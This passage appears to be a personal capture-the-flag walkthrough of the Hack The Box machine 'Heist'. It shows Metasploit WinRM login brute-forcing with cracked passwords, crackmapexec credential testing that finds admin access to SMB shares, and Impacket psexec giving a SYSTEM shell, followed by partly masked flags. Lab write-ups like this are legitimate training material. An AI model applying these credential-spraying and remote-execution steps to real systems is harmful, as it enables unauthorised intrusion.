+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\chase:4dD!5}x/re8]FBuZ (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\chase:$uperP@ssword (Incorrect: )
+                        [+] 10.10.10.149:5985 - Login Successful: WORKSTATION\chase:Q4)sJu\Y8qz*A3?d
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\support:4dD!5}x/re8]FBuZ (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\support:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\support:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\support:stealth1agent (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\rout3r:4dD!5}x/re8]FBuZ (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\rout3r:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\rout3r:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\rout3r:stealth1agent (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:4dD!5}x/re8]FBuZ (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:stealth1agent (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\hazard:4dD!5}x/re8]FBuZ (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\hazard:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\hazard:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\hazard:stealth1agent (Incorrect: )
+                        [*] Scanned 1 of 1 hosts (100% complete)
+                        [*] Auxiliary module execution completed
+A5              # crackmapexec to test newly found credentials against target
+                    sudo crackmapexec smb -u users.txt -p passwords.txt --shares 10.10.10.149
+                        SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SUPPORTDESK) (signing:False) (SMBv1:False)
+                        SMB         10.10.10.149    445    SUPPORTDESK      [+] SUPPORTDESK\administrator:4dD!5}x/re8]FBuZ (Pwn3d!)
+                        SMB         10.10.10.149    445    SUPPORTDESK      [+] Enumerated shares
+                        SMB         10.10.10.149    445    SUPPORTDESK      Share           Permissions     Remark
+                        SMB         10.10.10.149    445    SUPPORTDESK      -----           -----------     ------
+                        SMB         10.10.10.149    445    SUPPORTDESK      ADMIN$          READ,WRITE      Remote Admin
+                        SMB         10.10.10.149    445    SUPPORTDESK      C$              READ,WRITE      Default share
+                        SMB         10.10.10.149    445    SUPPORTDESK      IPC$            READ            Remote IPC
+A6              # Let's run psexec as admin:
+
+                    locate psexec.py
+                        /usr/share/doc/python3-impacket/examples/psexec.py
+                        /usr/share/set/src/fasttrack/psexec.py
+                        /usr/share/set/src/fasttrack/psexec.pyc
+                        winnie@kali:~/Documents/htb/boxes/heist/access$ cd /usr/share/doc/python3-impacket/examples/
+                            winnie@kali:/usr/share/doc/python3-impacket/examples$ python3 psexec.py administrator 10.10.10.149
+                                4dD!5}x/re8]FBuZ - pwd 
+                                    ADMIN SHELL: 
+                                        Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+                                            Password:
+                                            [*] Requesting shares on 10.10.10.149.....
+                                            [*] Found writable share ADMIN$
+                                            [*] Uploading file PMcQDTLW.exe
+                                            [*] Opening SVCManager on 10.10.10.149.....
+                                            [*] Creating service qvhN on 10.10.10.149.....
+                                            [*] Starting service qvhN.....
+                                            [!] Press help for extra shell commands
+                                            Microsoft Windows [Version 10.0.17763.437]
+                                            (c) 2018 Microsoft Corporation. All rights reserved.
+
+                                            C:\Windows\system32>
+A7              # cd to Desktop and claim your juicy root file. 
+C:\Users\Administrator\Desktop>
+
+                        ROOT.TXT: 50dfa3GOFIGUREITOUT897
+                        C:\Users\Chase\Desktop> type user.txt - a127daef77GOFIGUREITOUT295f59c4
+
+
